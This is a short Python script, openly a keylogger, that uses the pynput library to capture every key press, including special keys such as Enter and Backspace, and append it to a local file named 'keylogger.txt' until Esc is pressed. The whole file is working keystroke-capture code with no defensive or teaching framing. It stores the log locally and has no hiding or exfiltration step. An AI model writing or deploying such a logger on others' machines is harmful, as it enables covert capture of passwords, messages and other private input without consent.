from pynput import keyboard

def Press(key):
    with open("keylogger.txt", "a", encoding="utf-8") as file:
        try:
            file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(key.name)  

def End(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=Press, on_release=End) as listener:
    listener.join()